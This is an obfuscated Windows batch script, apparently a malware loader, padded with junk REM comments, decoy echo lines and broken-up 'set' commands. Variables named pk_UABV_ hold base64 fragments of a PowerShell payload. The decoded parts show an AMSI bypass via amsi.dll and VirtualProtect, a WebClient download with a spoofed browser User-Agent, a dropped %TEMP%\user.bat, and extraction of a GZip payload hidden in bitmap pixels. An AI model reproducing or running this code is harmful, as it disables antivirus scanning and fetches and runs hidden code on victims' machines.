@echo off
REM hawk echo lance delta kiln phantom glimmer twilight kappa zenith
echo dEVtSkMxdU1mUmxVbDhOQ2pzRjN2QjZTSkt2ZkF4WWFPNWF5WHB6VUtnWElya0o4MXdqNXBiWjlrR0s2SnNXTUNIQ2xrYQ== >nul 2>&1
echo ZTB6eURhR05xaHRiNE8yRWhYOW1pNHNPbzh3Y2FyZDJVYjRnR2JXZENOU2Fka3NudGtDUkRZMHpOa2tnUDhQYg== >nul 2>&1
se%TfZz%t "DNJbGcpvOZO=jXUmbxWOssKyarffExWSlbWsRQZldb"
se%EqH%T "pk_UABV_0048=BjbG9zZS4uLiI="
echo bGVXeFNERjNoV29xbWZCUmpMQWZxY3VVTmI1SkIzRkNTMHhIYVZDR3VDdWxJanRQOG9lVDd5TWF6Zg== >nul 2>&1
REM echo undergrowth kappa fathom valley vision
REM twilight vision twilight phantom
echo RUV6eDhTS1dQWnBvd3k1bkRkeUJKUEhLVW5PbUtKQVJOVUc2NkRqa0k5Qg== >nul 2>&1
echo UXh4S3RNNllZWlU4MlJWcWozekt1YWp2NmVIZHBGS002RFBVQ1dLMUZsU2podDlram0wNWwzNGhQ >nul 2>&1
REM circle zenith valley beacon ruby guard kappa binary
echo QW9tU1NjTkxmaDF1U2g4aVlLQ09pZ3hQbDFEbks2allqa1hwYmpKcEpuOVhGMXM= >nul 2>&1
echo S0hwZGFaQXE5VzJ3ZkQxNGp6V3lqUHVjcWp5bHdnT29vcTFOMFVra2xBcjZzZUdQajNnSW1lYw== >nul 2>&1
REM strobe clearing zenith pixel ruby twilight
REM phantom ruby glimmer core valley shadow strobe guard echo cipher
SE%gNjys%t "VfLmRKVwZ=HMKKZCsHHX"
echo MmU0SVV3Z1I3NGIxaTFGazlPQVU2M1FJTTByeGtRMDZyZTRxTjQ1OHdwWGhQU0VGSlhoQm03Mmt4SEVSUFpHd09qMUQz >nul 2>&1
REM clearing clearing echo vision zenith binary undergrowth ruby glimmer vision
REM echo shadow vertex clearing sword
sE%iQDxx%t "AloxTvTVBwVJBrh=htgKbCDbKxtkywSBZQtVppqTMM"
REM twilight guard glimmer undergrowth twilight
REM guard cipher strobe cipher valley mirage beacon sword binary valley
REM clearing circle twilight circle kappa vertex delta binary lance guard
sE%EGQGi%T "OYanSWfwr=LHVgznKVdhOztKOtasAGmrVdmP"
se%dKXkp%T "skYDXgEdZtZHaqQ=mqOnPdNQwgobDmZgHUFYojFaZuXmgE"
REM lance circle binary ruby odyssey ruby kiln fathom fragment sword
se%DpqWa%t "THZoLerIzqwx=tOtdfwQpmvoXHklxfGgfvfezCBjCJlrjV"
SE%SMYYg%T "zjDEnzcr=OPIfSvrpqypABjzzsbWeGAvWOnTsznrD"
Se%roV%T "dkczwO=maQsqGZmEuleMWxN"
SE%OicYm%T "JnucvFfpXkNbS=cMLoQzSrElhJwgkH"
se%wrt%T "pk_UABV_0031=Qnl0ZXMoJFNvdXJjZSkKfSBlbHNlIHsgcmV0dXJuIH0KJG1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkZGF0YSkKJGJtcCA9IFtTeXN0ZW0uRHJhd2luZy5CaXRtYXBd"
echo TTg4eXNmUms3YzBSVFZ1ZHNLMlhpYVkydEI3NTRpaGJWRkFXWjFSSHRlZnpaUFpPY3pVSmswZnNwNHFlWA== >nul 2>&1
SE%bsVAR%t "IlkFVbzWwjW=srwIoNWXZyBwEzOJEKzDBPVWWWwnEOXZU"
REM shadow undergrowth twilight undergrowth valley clearing sword
REM vision binary clearing circle phantom lance beacon fragment
REM vertex cipher strobe odyssey ruby guard
REM clearing ruby ruby beacon cipher
SE%bflns%t "lNrInsfOlDkULDi=nGbsrYsaqscaemXqFxHrZmZBWAjENDQ"
REM kiln mirage strobe strobe twilight binary delta shadow
REM vision delta shadow clearing glimmer core strobe fathom glimmer glimmer
se%uVm%t "ESWwbIXUtMVvvcH=XVXOhkiXTGuzTzsVFuumrTBbg"
echo a0NoeE9XeGJUVVZWaVBmNHM2S212NWpyaWx2ckQ1NUdiYU5WZ3RMdTN5OEt4VVEzclMwNjhiSkRBUjR1TFY= >nul 2>&1
se%FAZ%T "ucKgPPrPvdsuPS=JmLBeVvqrJxeghzLKJpVFoLNoBvm"
se%jVYr%t "pk_UABV_0021=W5kCklmIGguU3RhdHVzID0gMjAwIFRoZW4KdCA9IHMuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlVEVNUCVcdXNlci5iYXQiKQpXaXRoIENyZWF0ZU9iamVjdCgiQURPREIuU3RyZWFtIik6IC5UeXBlID0gMjogLkNoYXJzZXQg"
REM kiln shadow binary pixel fathom hawk
se%nXAMc%T "huNHEPBzHTm=FQrsWXUiGllBlZpIBJ"
echo RGxNdzhGczFVMU5mZ3hTMXFxNzdwUmExa0c1VkdVRnZaTmtBeEdMVzZRRjVrV1ZMYTQ0SG1aNTd5OHBYa3Bt >nul 2>&1
Se%JABc%t "nLWlAjHQlweq=WMYHRTgmmJYHjMzEOmRz"
se%shCj%t "yvpLHNdLQemGnFN=eQrVaIlVjMPqTplaToSbNeTGG"
se%eHQgk%t "LXuTUIZOvfgRJXu=rxCfblPqcbphglOnoSgFtkmZV"
Se%NBHyc%t "dyrhRJEW=FDpxpGKzQUxYvCANBce"
REM circle fathom ruby lance twilight binary zenith
REM core circle mirage strobe kiln mirage glimmer phantom fathom
sE%rDH%t "EoJXeaWk=eNfYDRzNfEflGB"
REM odyssey binary fathom fathom pixel
REM delta mirage kappa circle binary kiln mirage odyssey
se%oliK%T "CNrRthJS=IhUQFnrgkYqQRmwnlhcydeaiZftI"
se%ndoh%T "yewMfLEz=HydwzAoNSMyX"
sE%DQR%t "yoabHeBcONGxVS=bWOawVOKohdBbGunxxUD"
REM core mirage mirage kappa beacon guard cipher
sE%itD%T "ZAxNDPzuFPnspEc=KtCjmIIDfTDaQLloBktitbnNrfGBj"
REM shadow core sword mirage vertex glimmer binary
REM echo twilight valley kappa delta
REM glimmer hawk vision odyssey fragment vision hawk binary valley
sE%VDjm%t "CeaxcQNSVUjZe=ECIRSwCdZUHzcHzORydlruatekKfTEP"
REM clearing shadow clearing circle odyssey
Se%kYw%t "mYaOUPPXMjpZatA=TqExWJPRRyPgMLPQkpbEkgVyLGxQQDq"
REM kiln delta glimmer clearing delta circle fathom undergrowth vertex
se%ZTt%t "KgvybRJZuPMsW=WOPaOTXxIRBbKrHcLptfTfnnpnTh"
echo YVJSVU5yRjYxbHcxUHcwY3lFNjdLVTdvYUZ6bm4zUzhab2ZRWHZwVUEzeHMycmFsTjNLeVdnR1MyUnh5blFoR2JB >nul 2>&1
se%GPJY%t "WXgviIg=OfKwlrGvKPTRAiVyTS"
SE%WhIhA%T "sKxCwitzyHIpRov=QJVOQdGXZowGsZFbPPXpjG"
echo bnRGcWZadDJIRWtuRXF3YWgzeUlpeTFaZndJU2VvOWNkTkw2eVcyQWgxN0pvTkRFNUY4Q0JjNWw= >nul 2>&1
SE%WBzrh%T "DMGSJnjurfho=EDPJaALpXoPPkhMbgoTapt"
REM valley echo echo delta guard delta vertex phantom
echo eGhRWUhKa3B0b01TQTB2UTJQU1ZjMjJvS3k0dlEzOUpoc2lXbDlpU293dW8zSmE= >nul 2>&1
SE%YdL%T "pk_UABV_0014=xseS4iICJHcmVlbiIKfQp9IGNhdGNoIHsKTG9nLVNpbGVudCAiWyFdIEJ5cGFzcyBlcnJvcjogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiICJHcmF5Igp9Cn0KRGlzYWJsZS1BTVNJCiRJbWFnZVVS"
SE%EKMZ%T "gSqBXK=hlJRGDRxXIkTTFULdLSecvBMluX"
Se%zKpQ%t "kwjHfIrby=QIWsPtfKzZclDaMBXhQotOgKHSs"
REM lance mirage ruby beacon delta strobe shadow
echo SFFOaXkxT3M2T2V6Q1E4Qlpqd0twTm94OXFDSktGeDJyVzRlTTM0eXhuUzYwdDNvbmtIT29YeWRHMmk0MDY= >nul 2>&1
se%DxfBB%t "pk_UABV_0029=ZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiR3Yy5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYiKQokZGF0YS"
Se%ydTX%T "dqLdyLGErfhw=MiZbNvZKNqknzNzlHkfcNg"
REM valley twilight circle valley
Se%ZkXb%t "XrZcAhopJ=NVkndOUGsADZSQWJDt"
REM undergrowth shadow strobe pixel vision twilight pixel pixel
se%CKTg%T "zkxlQIAhQG=PZkVMYLgPTbGFXRQIXWKQEamEJT"
SE%kMMiY%T "ZawdeyUWFAf=TCUOOJAuBrIGb"
echo eHBxMkNWbDJMSGQzQm1uM3V3bVcxdXd2RWVtVnJVblQ1T0YzYlhsSjZtcFBBOGxGem5t >nul 2>&1
Se%zQf%T "pk_UABV_0008=1Byb3RlY3QsIG91dCB1aW50IGxwZmxPbGRQcm90ZWN0KTsKfQoiQApBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gJGNvZGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKJHR5cGUgPSAkY2xhc3N"
echo Yk41T1V5ajVlbXJQRjdGN1FQZUtzdVB6dkJCdWp6SzV1M1ZMUzdLVktOSXA5UlZIWnU= >nul 2>&1
REM echo clearing hawk echo vertex vision glimmer odyssey undergrowth
se%Segu%t "FpoZpZ=gImhELWkvzkkEvUkxEBMwsygTTTBAL"
REM valley kiln cipher binary core
echo T08ySXhzSzJxRk05M2VRaU1DbzRDM2h2QXU4cGRtamxmcUtXVTAzWjVzSG9hejhYV0lVMEQ0Zw== >nul 2>&1
REM twilight beacon echo core phantom echo echo fragment vision
REM circle twilight echo
REM kiln sword shadow mirage lance
REM mirage ruby undergrowth
echo SFBnSDh1cVhGZUlCMHVhbnJBQzlieWlpRTlxb1hqcU02MFdmbXpHSVVVRjNROW4ydkhMZEtiMVJ6Z0VtMzdSMGRkVWNXUzNV >nul 2>&1
REM echo beacon vertex core ruby
REM sword phantom vision circle twilight hawk phantom fathom guard
Se%VcSY%t "ITiQxywNeg=xmBToBXJaEprXhPRLDWWXscIfrJ"
SE%vxnK%t "BmpyGhRnt=lPAhhyWeueklJOFv"
REM twilight circle clearing zenith kiln ruby
REM valley hawk lance fragment
echo emROWURLRTMxWHBzNXFIUXFOZG5XNzk0RURHRWZpTGs4Z1ZpSGJmb1FN >nul 2>&1
echo bUp2RVpwN2F3Y3RkN3h0cEh0ZjZVUHhjZjJUN1NnS0N2MTY5MVlnR3h5UzlMamFZdzZPNTVVUGVqVWZVVEl6bjlJdVBtelZ2SFlPY0M= >nul 2>&1
echo MzAybUZhdEUxV1VnYlc3d2xKb1hrNEY0clBQMnVsQ2pXZFpPZXNWRUJLbQ== >nul 2>&1
REM binary strobe binary fathom twilight
REM ruby odyssey cipher pixel
se%egH%t "DJtOjxzDwSjd=KYJwYkcBlzkcXQU"
REM kappa twilight hawk kiln ruby cipher core hawk odyssey
sE%bwUzk%T "UxNbZcbRcObyJU=lBcIwIfeDGbEaUxFsAGcodDPezssZc"
REM glimmer binary echo sword shadow lance
REM delta strobe glimmer glimmer
REM clearing glimmer kappa vision
Se%Fga%T "dHUGcBMESwqhVa=QrgamxGxvVSJH"
sE%riIpH%t "mDauwGWgaSpEaNH=FplCNuBVudcKLWgo"
se%lGR%T "qUrxPqfMiV=giDnIUpBmnDSOfXKgHjgjmvEgFlytfIf"
echo T0lRWlZNdXdDQkdVWTcyU3VYa2lRcFJxMVJUTEZ2UlR3anFUaEU5OVpIclFKbkcxT2o3V1FqNmhQVWlLNjZkc2RmaFhaZlh2ZVQz >nul 2>&1
sE%Wdtn%T "RgMVZdErAeBMwEv=HerwXsaaoIPNkdPzYvyOlUcgyaaXfewHP"
REM ruby hawk beacon binary kappa delta kiln circle strobe
REM circle fathom clearing delta mirage valley
echo Qk9IU3h4T2Radlk4cDVlVmRNUU5ET3NkOGw4cTJ1RXJyWXVacjVwbDZoOXNHTW5MVXVUbzBzSUdDWUdNUWtmTzJwMXlOT2U2cW5BRmhTSUQ= >nul 2>&1
REM vertex kappa undergrowth
SE%ZPhs%t "pk_UABV_0033=SAoW3VpbnQzMl0kcDAuUiAtc2hsIDI0KSAtYm9yIChbdWludDMyXSRwMC5HIC1zaGwgMTYpIC1ib3IgKFt1aW50MzJdJHAwLkIgLXNobCA4KSAtYm9yIFt1aW50MzJdJHAxLlIKTG9nLVNpbGVudCAiWytdIFBheWxvYWQ"
SE%ONw%t "vbyEPKK=zIJhRPIOidLcztLnLLzHNFpl"
Se%hhUd%t "YhbcVoTeNKtFA=gETYcbTpqwIJ"
REM valley vertex zenith pixel core binary twilight odyssey mirage
echo ckVtYlpKM2k2Rndham5zdlBHSkpBaExsWHhNYWczZlgySnBMMDZHMzk2YnIxR3pkMDVQTFQ0dm5PNTZZalhScQ== >nul 2>&1
Se%xLk%T "pk_UABV_0043=pb24uQmluZGluZ0ZsYWdzXSJQdWJsaWMsU3RhdGljIikgfCBXaGVyZS1PYmplY3Qgewokc3RyID0gJF8uVG9TdHJpbmcoKTsgKCRzdHJbMzddIC1lcSAnXScgLW9yICRzdHJbMzhdIC1lcSAnKScpIC1hbmQgKCRfLkdldFBhcmFtZXRlcn"
REM fathom fragment twilight twilight
sE%TiwXZ%t "sGtfsbpsUx=xbjZFfqKkfqNoBNdBGAY"
se%kqP%T "rJAxgkLrnuGffon=xTZafWrElxBtvftsMtD"
SE%qKds%T "HjSxHYzCejLHG=UjARypuCKfrh"
sE%rku%T "SaBIiKjvhtOg=EUAnkaGxHh"
SE%uaWY%T "sxQsYIAgwYX=SWAhbYHltMZHOYxtBQvguibA"
echo YXBVNUlpaktkSmp2akJFZlFBSnFWbDZuZkxOczhkdHhDZkxLeWFpUjNHY056 >nul 2>&1
REM twilight mirage kappa glimmer core kiln binary beacon
Se%btjM%t "YYLkrLaycSYPjE=CTfgXWeUBJQlueG"
echo V0RRRHZxU2lXOThHa0JRWThqV0l2RDBVZGhja1NyYmFiRExiSWo1R0ZiblZ5SVdrQnhDcnh0bzY5OHZnQjlzMGtvejF3UjRv >nul 2>&1
REM mirage valley sword strobe undergrowth sword zenith valley sword mirage
REM strobe odyssey beacon
SE%LWXjf%T "pk_UABV_0009=OYW1lIC1hcyBbdHlwZV0KaWYgKC1ub3QgJHR5cGUpIHsgcmV0dXJuIH0KJGhBbXNpID0gJHR5cGU6OkdldE1vZHVsZUhhbmRsZSgiYW1zaS5kbGwiKQppZiAoJGhBbXNpIC1lcSBbSW50UHRyXTo6WmVybykg"
sE%DbfE%t "qIBUPIznEF=ewkPWCsArsoMDFmbXqSGSx"
Se%YjU%t "JlNwGvaTp=MSaIOxeJPuNoyEbnIEaEQ"
REM beacon vision circle vision cipher undergrowth shadow beacon
REM binary delta hawk binary zenith
Se%GtGRr%T "ONqHabjjJm=pnGjOEIYuPvdnarrrik"
echo cVhKdFVaaG5DYzh1Y2lIT0FEdVJkb2xZR3VxY1JmZDlqTUFOVmF0VHBU >nul 2>&1
REM kiln valley glimmer vertex strobe core
SE%idK%T "UrmXTliiBj=GmIRuZHhnAknBrkmvjnUXLMeCFAumF"
REM mirage echo echo kiln core vision kiln
REM odyssey delta odyssey sword pixel glimmer circle fragment
echo SXVYMzRVOUtWVmU5NU8zYXV0WE1aMU9mbnFiVUl4T29OYlM0Y2Rta0RNdUtoSTJxTTdMSk9mV0YwN0JxWExNVllGQw== >nul 2>&1
REM binary core sword twilight
se%nHmUh%T "RPRnGteEeMTRi=sITsbYGGwUCLk"
echo ZzV3THhEUUoyVE1Uc0JONDRBajFzRTJZbnNob3p3SE9NM0YzNDM4d0t4cU5pR3h2QjQyaVNrY3d4eDBVMzZhWURENGtjamlWT0tNVmx2Wg== >nul 2>&1
REM ruby echo shadow binary zenith
REM valley undergrowth shadow strobe valley zenith lance
REM odyssey kappa cipher guard circle valley vision
sE%GeI%T "pk_UABV_0007=HIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKW0RsbEltcG9ydCgia2VybmVsMzIiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgdWludCBmbE5ld"
SE%RPV%T "OcBEITBYrndj=dmLBYYWyCR"
sE%PrvSI%T "PDHlDqwsrJwH=bDyWkaCTKZsZXuqYwMtUmAuVj"
se%AYr%T "cyBeVfvxiWDgW=SKdgbWtGmDBPmbRHxTwB"
Se%MxDj%t "gPuXWe=OUCRVWIRQGnmFzcHPobjBFYMfRFgujafUl"
echo akp3cnlUNVZDR1pIaVZ0aWRJeEtkZWRZZndyZ3JkRkdqYXJQTzF0UVhrQ0tFV2xpR2doNk5yQ2VTOEQ= >nul 2>&1
sE%IEO%T "fFZVjbJTcE=YRBDXeZkrNynmijOoHwR"
SE%uWCh%t "RBpDjsEy=lfkHRnyCIyqjKOd"
REM vertex circle vertex fathom
REM circle beacon beacon twilight ruby hawk zenith valley vertex
se%VUAnx%t "GDTRywWeUUyqIt=RJTADxzjMgAGpRL"
REM odyssey vision zenith pixel undergrowth pixel valley
echo Mzl5NTQ4SDIxM2lvblRuOFo0NWtnbkhmTWtNUnhmMzZUbUt2RURnQkxON0tUcDlKTmNpd2dyVTZVS0VHT0lpNHhBSnlub2lOeXRRcUYzQTU= >nul 2>&1
REM mirage core beacon circle vision binary
REM sword strobe undergrowth echo echo ruby beacon odyssey fathom circle
REM echo echo beacon vision kiln delta guard valley vertex mirage
sE%EqCa%T "fhZKGpvlYRmVqJ=sGcxLjLtwRDAIFI"
se%SgFQ%t "YTbRjWexj=gLmIkhpPNcaULcbypZfrOGQ"
REM zenith shadow clearing zenith zenith odyssey beacon
Se%FAYT%T "VeCHwEpyzQfV=FWKKNVquPjoyq"
REM clearing undergrowth fathom circle hawk undergrowth hawk pixel undergrowth
Se%KhK%t "gKfkfgFBgdTxB=QDuaQgEmVDtPqxMQtnhKSzuHOcw"
REM fathom clearing kappa strobe vision undergrowth
REM ruby odyssey ruby lance twilight twilight sword vision
REM kiln ruby valley fragment twilight
REM kappa core vertex odyssey echo sword valley
SE%aqLiT%T "XLaXtuSgLULSVak=FXCdLJLTYpEIwYcMFrXmnJojcgDNy"
REM twilight delta vertex kiln guard odyssey ruby fragment fathom
SE%NhC%t "ythpmiEc=vIlvgieAZRyjgzDhbyfyUNrzboC"
REM vertex valley sword lance sword
sE%ZxNZ%t "lXBnIiBkqJfC=jxyjpvmTgMdbBgH"
se%bxf%t "pOfiHlDyaHQ=eqqDIdXyVvoOAuCXjzTFQLqEtGMiO"
Se%Qeum%t "pk_UABV_0006=2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7CltEbGxJbXBvcnQoImtlcm5lbDMyIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQd"
echo SkRNU0JiTnRBU0dHcnhLdFNrblVqSmVvOHJVVjFTWXZZQ0hFblppbVFoQzVlbEFQY0VEblJlWTNLSWNjNkNOb29za1Ntdm55Rmw= >nul 2>&1
echo MjhpMFA2N1pyc2VJaE9vSGFqSjFhY0RhOTVMajJyOTFzWHB2YnBZWmk3bUdQcnJnN3NKV0JHOE5KQ0F2R3E0c0ZKU1lsNVRnOQ== >nul 2>&1
REM mirage hawk guard fathom vision phantom clearing
REM odyssey clearing beacon fathom guard
REM twilight mirage beacon
echo VWxpa1l2Q0RQVEpJUFNpWjg1bHhaT1IzcVVTT1pRNWJxRWwzQ0dwUGdRNw== >nul 2>&1
echo cHFmUkJMNExKUmhWVFBvNXFzRFZ0RTVFRlpKWWxBYXRTNDJiNkRSdEhVeTV2UW4zTE1TcW5HT0syVTRUclpKTUY5ekJ1bk1OSQ== >nul 2>&1
se%KNN%T "pdQOMelFjS=WLKEJiNFRBIXLwpREX"
echo cTdOYVBlMHUzOWV3V1NXTGRteWR6cURJWmhaYWZiSkgyVEhvOTRlWDh3cnJubDBKRm9PNHg5YzRhS2Mxbk9JYVRn >nul 2>&1
REM binary clearing vertex vertex valley strobe cipher kappa delta odyssey
SE%DGW%T "uHjpeKed=BAidvBJxBDy"
REM hawk shadow guard
REM delta undergrowth vertex core mirage core undergrowth fathom delta lance
echo RFFvYkNDZ2dPQ0V6TWlkdzVlWmdRakxtSnlwQk5Td3RiVFI5b3NIWklSdw== >nul 2>&1
REM circle cipher binary guard sword core
REM lance core binary
se%ixo%T "dLbFUYl=OsthopgIJKFboGuPxuUNBYH"
REM kappa undergrowth glimmer fathom delta glimmer clearing phantom fathom
REM vertex shadow zenith odyssey zenith odyssey undergrowth vertex mirage hawk
REM zenith fragment valley
REM undergrowth delta strobe echo
se%vVcn%t "pk_UABV_0041=aW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLWFuZCAkXy5Mb2NhdGlvbiAtbGlrZSAiKm1zY29ybGliLmRsbCoiIH0gfCBTZWxlY"
Se%XitAw%t "sintyaxLk=mlhIwwTGoxbPW"
REM echo beacon zenith core guard
REM fragment fathom echo strobe circle pixel
echo WEpFWTFyWExGV0hZeVZPTjBiRGFGWXhyOWlYWlpXallYY1d3Vm8xb0U4ZDAzVlV6WGk2bllyNTJ2Zk5GQkRHTHBWcTdPb3lVTGR0ZE9ZaTk= >nul 2>&1
REM phantom clearing cipher vision sword twilight kiln circle delta
REM sword ruby vertex
REM fragment fragment valley cipher
echo Y2dZdzJaRE5pdHEyV3FwbGtOeXN4c0RNSTg4QWhHZUZsZnpXWkh1NFRwekRUaFhxRE9nQW1WOEZKVzhndEE2dkI1dU1BTUNyOGRV >nul 2>&1
REM vision valley shadow guard
Se%BUuf%t "GVflLzpmfX=xsPVYSwNhefXGTeyXqXlYtJYpJLukNn"
echo cjkwSEFYdTgyWDIxVWtQOW5WQWIxZ0lQNnJPa2ZnQ1RYOHJsRkd6aVJ2dFZjRU94NTFEdW1pMjM0YkF5Q2s= >nul 2>&1
Se%TZrp%t "cGBISifOeu=QkgxQqEVkZhmQsUZHcZUfeJyweBdxOAyVV"
sE%xJoHQ%T "COVjpPg=JRfnvltdpjCKkDYAchOeUxCohEBl"
echo dHNoZGdjOEhwRXJkSzFYWWJIYlNPYnZabTN2aVRTcmRzWEx2TEx5dGVDQ0doa2M1NjFWMk16Ull3 >nul 2>&1
SE%PQP%t "FZDttcoYwWaC=OyhZBvVYMsHjaTOJXQQxZs"
echo Ukx1OEY2eTZlYlVneUhmbDdoWGU5aUVXejFybDN2SjZMNnh6VnJiYnNaNjcycFByeDUxZU1qYXg3V1F4MUQxWDFyNlMyVUFnYUdPeFg1YQ== >nul 2>&1
echo S0pxWXhLbFVDd0NtbTRKbHRuNHdZSlowWURpTXFKSnpSbEdRYjVhTk10bDJJNEJwSW8yeWZ4bFhUd3RLanE= >nul 2>&1
REM phantom kiln zenith mirage hawk echo
REM kiln vertex binary vertex delta beacon guard
REM twilight shadow odyssey circle guard hawk phantom
REM clearing fathom lance
sE%DDRJP%t "SbsvEDcuFaFXc=BcyztrsMSSMPikkSGHTpsNIulOrpZvVB"
REM vision delta fragment ruby
Se%PVCxP%T "CzvPfvMXcrt=wvpbbsVqQMKOBEzIoFFWWab"
sE%ibaBr%T "iwYFfRasTwP=sOaXvfYZcrERtmrWoWmZKCimcrwtrvxF"
REM vision vision strobe delta echo kiln pixel guard clearing fragment
se%WjH%t "FUwaGvrK=rGkxWyQGCBrke"
sE%yfLq%t "SXHVracOLmipR=GYBUUFtDnYdHI"
Se%ikzht%T "ECtoSg=MrzmSJPCPvMmwlmuOaKNFlHlOKzkFWjlIE"
se%BAaj%t "LwcXVeOYVlT=yOFoiHtXqKAKUdMhPkL"
SE%RKYn%T "JSXTmAqyKKqPgpM=cHLdSKcxcXEpswlNiwYGkvHawiotawPiL"
se%aeuL%T "VNfHtzXQA=rgidvDOMYuzFg"
Se%sft%t "AimHGHVkCc=GELYmJqKPSVur"
se%VDm%T "OHIdBpFsnTGI=sigXiLivaaAbcSwCbpbquo"
REM core kiln fathom glimmer phantom fragment sword
se%Etfm%t "oYJQQvYsoCYdQub=tjINYMwrMZciksteMlbrPaGHKhbwFk"
Se%ONMkU%t "bnHVFaB=JYMetoxASXvV"
sE%JXIrq%T "CkUELSAeZeTX=XzYpyZFjNpmSDWRwhIeYmCeGZZp"
sE%OKu%T "tOuVkwrevN=bHFverkYKeXsljpBYjEbfnxajB"
echo RzdGUkxERE1FRVllU0xTeEtIWTJ1MUdsWEZBd3BtNlUybzNqT3pjWXdnZGZOU1hJYkF2eXBzMngzZ3kwaUc5TFV5TUgxZDY2VTA= >nul 2>&1
echo cUlZOENLVElvdDdWYm5rY01mS1JVSDhuR2JWMk5lYTZNUG4xbmtzWmR3aGlqY1d3cGp5cm5uVmhQeXZRalRx >nul 2>&1
REM vertex kappa core kappa ruby vision hawk ruby odyssey
REM phantom ruby lance beacon
se%pYNZ%T "WMiuTMPzWzME=sZMTfsCRqhIXEUunbfFjRRs"
SE%yrZLN%t "sGADnabeEjR=QITpqNveXbHcC"
echo UExkdjRzSk5wWG9KbVVwbDFmdkw3Ymx6TDNnUGRhbEt3MUI0dW0zeXlWM1M= >nul 2>&1
Se%wvY%T "LWGHTKCmCKDHF=qmPABIDHlpAEi"
echo VUtkSmt0bndxN0RVNXk3eXdBZUxCUXhxUzBrNG5BeURzQW43SlhSeE5PU250cA== >nul 2>&1
se%TPd%t "KtTRoLXjlSvom=TdmsAJKLxoVIfkyVFvjD"
se%JaI%t "bjmgMnpYnN=hhJTSJdatPCdRwdArQMrANulVzPcAy"
echo SzB2WkRTTWFENjFJOWpaaXU4eTFjckZaTmlNREF4REdkYzBoV2U4bTFOMFNXeVlUQWI0WGpHOFNxU0JRT3NBTHBDV2ljTUJtbQ== >nul 2>&1
REM core sword beacon fragment ruby strobe mirage vertex mirage
REM fragment kappa vertex echo hawk ruby shadow
SE%RrUln%T "pk_UABV_0039=TeXN0ZW0uSU8uQ29tcHJlc3Npb24uR1ppcFN0cmVhbSgoTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCwkcGFja2VkKSksIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzc"
se%XHRH%T "GvouhG=uHHtyBOynoNfmKNctD"
se%ZvG%t "gvszmMoWlT=ZBcxvXsMKvqCseIlCWoJdtXNpSmoHWi"
SE%UypdO%T "XjgHbzgKFhjSuw=ZxgHJhsucvHMkIMlfxSZLiKPTNzuLWKF"
echo S0s2blR6TFVDTU8xRDR1MHBWU1lPTldQRU9uMmJrZ1d1T1NFcjJIbXdzRzliaTRkWVFITVV4dA== >nul 2>&1
Se%dOHt%t "aiBYrSKEh=rucEcpqLqgSpioAinJUT"
REM vision glimmer vertex kappa pixel phantom kappa shadow guard
echo UzZPS0xNN2F6YkZEZU5SM01vWTltcjhwVmxmbjVJTUYwVm92bG9lZ0JZN0dPcW56akpuelZJb0xRVDR4a0txeDU= >nul 2>&1
REM circle ruby valley twilight sword circle strobe glimmer odyssey cipher
REM kiln shadow strobe clearing strobe strobe
echo RjVqS1l6VFU4NEk1Z2pJenltTmJaYXlHSXJZSjJMcnNreGFTSnlTbkpYNE83cEtLWFJWRw== >nul 2>&1
REM kiln phantom sword kappa
REM ruby fragment echo fathom fathom mirage mirage undergrowth
